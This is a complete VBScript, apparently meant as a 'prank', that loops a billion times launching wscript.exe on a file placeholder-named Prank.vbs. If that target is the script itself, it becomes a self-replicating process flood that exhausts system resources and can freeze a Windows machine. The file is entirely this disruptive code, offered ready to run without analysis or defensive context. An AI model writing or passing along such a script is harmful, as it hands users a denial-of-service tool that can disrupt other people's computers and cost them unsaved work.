Set WshShell = CreateObject("WScript.Shell")

For i = 1 To 1000000000
 WshShell.Run "wscript.exe ""C:\Path\To\Your\Prank.vbs"""
Next
